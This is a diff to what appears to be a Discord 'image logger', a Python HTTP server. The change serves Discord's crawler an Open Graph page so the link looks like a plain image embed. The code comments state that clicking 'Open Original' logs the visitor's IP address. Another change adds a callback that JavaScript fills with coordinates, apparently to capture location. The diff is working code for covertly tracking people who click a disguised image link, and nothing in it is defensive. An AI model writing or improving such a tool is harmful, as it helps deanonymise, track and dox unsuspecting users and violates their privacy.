@@ -264,14 +264,29 @@ def makeReport(ip, useragent=None, endpoint="N/A", url=False,
     return info
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Fake "loading" GIF served to Discord crawlers
-# ─────────────────────────────────────────────────────────────────────────────
-binaries = {
-    "loading": base64.b85decode(
-        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
-    )
-}
+def _make_og_page(image_url: str) -> bytes:
+    """
+    Returns an HTML page with Open Graph meta tags.
+    When Discord crawls this URL it reads the og:image tag and renders
+    a large image embed with an "Open Original" button.
+    Clicking "Open Original" opens the URL in the browser — that's when
+    the real visitor path runs and the IP gets logged.
+    """
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Image">
+<meta property="og:image" content="{image_url}">
+<meta property="og:image:width" content="1280">
+<meta property="og:image:height" content="720">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="{image_url}">
+</head>
+<body></body>
+</html>"""
+    return html.encode("utf-8")
 
 
 def _make_image_page(image_url: str, callback_url: str) -> bytes:
@@ -364,14 +379,17 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             endpoint = s.split("?")[0]
 
             # ── Discord / bot crawler path ────────────────────────────────
+            # Discord crawls the link to build an embed preview.
+            # We return an Open Graph HTML page so Discord renders a
+            # large image embed with the "Open Original" button.
+            # Clicking that button opens the URL in the browser,
+            # which hits the real-visitor path below and logs the IP.
             if botCheck(ip, ua):
-                if config["buggedImage"]:
-                    self.send_response(200)
-                    self.send_header("Content-type", "image/gif")
-                    self.end_headers()
-                    self.wfile.write(binaries["loading"])
-                else:
-                    self._redirect(url)
+                og_page = _make_og_page(url)
+                self.send_response(200)
+                self.send_header("Content-type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(og_page)
                 makeReport(ip, ua, endpoint=endpoint, url=url)
                 return
 
@@ -429,10 +447,8 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 cb_params["url"] = dic["url"]
             elif dic.get("id"):
                 cb_params["id"] = dic["id"]
-            cb_query    = ("?" + parse.urlencode(cb_params)) if cb_params else "?"
-            # If no params yet, still need ?
-            if not cb_query.endswith("?") and cb_query == "?":
-                cb_query = "?"
+            # Build callback URL — JS will append &g=<coords> to this
+            cb_query     = ("?" + parse.urlencode(cb_params) + "&") if cb_params else "?"
             callback_url = base_path + cb_query
 
             page = _make_image_page(url, callback_url)
